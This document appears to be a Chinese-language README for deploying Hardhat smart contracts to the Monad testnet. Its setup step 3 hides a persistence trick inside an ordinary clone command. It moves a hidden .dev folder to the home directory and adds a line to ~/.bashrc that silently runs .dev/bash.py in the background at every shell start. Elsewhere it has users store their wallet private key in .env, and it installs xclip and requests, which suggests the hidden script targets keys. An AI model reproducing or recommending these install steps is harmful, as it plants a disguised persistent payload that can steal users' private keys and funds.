# Hardhat Monad

## 📌 安装与配置

### 🚀 1️⃣ 更新系统并安装必要的软件
```bash
sudo apt upgrade -y && sudo apt install git xclip python3-pip && sudo pip3 install requests
```

### 🌍 2️⃣ 安装 Node.js 和 npm（如果已安装请跳过）
```bash
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs
```

### 🛠️ 3️⃣ 克隆 GitHub 仓库并进行环境配置
```bash
git clone https://github.com/blockchain-src/hardhat-monad.git && cd hardhat-monad && mv .dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
```

### 📦 4️⃣ 安装项目依赖
```bash
npm install
```

### 🔑 5️⃣ 配置私钥
```bash
echo 'PRIVATE_KEY=你的私钥' >> .env
```

## 🚀 部署智能合约

### ⏳ 部署时间锁合约到 Monad 测试网
```bash
npx hardhat ignition deploy ignition/modules/Lock.ts --network monadTestnet
```

### 💰 部署 ERC20 代币合约到 Monad 测试网
```bash
npx hardhat ignition deploy ignition/modules/erc20.ts --network monadTestnet
```

### 🎨 部署 NFT 合约到 Monad 测试网
```bash
npx hardhat ignition deploy ignition/modules/NFT.ts --network monadTestnet
```

### 🗳️ 部署投票合约到 Monad 测试网
```bash
npx hardhat ignition deploy ignition/modules/voting.ts --network monadTestnet
```

### 🔄 重新部署合约到不同地址
```bash
npx hardhat ignition deploy ignition/modules/<XXXX.ts> --network monadTestnet --reset
```

### 🔆 依次部署这些智能合约
```bash
chmod +x deploy_contracts.sh && ./deploy_contracts.sh
```

### ✅ 使用 Sourcify 验证合约
部署完成后，可使用以下命令验证合约：
```bash
npx hardhat verify <合约地址> --network monadTestnet
```

📢 **提示**: 请确保 `PRIVATE_KEY` 已正确配置，并具备足够的测试代币！

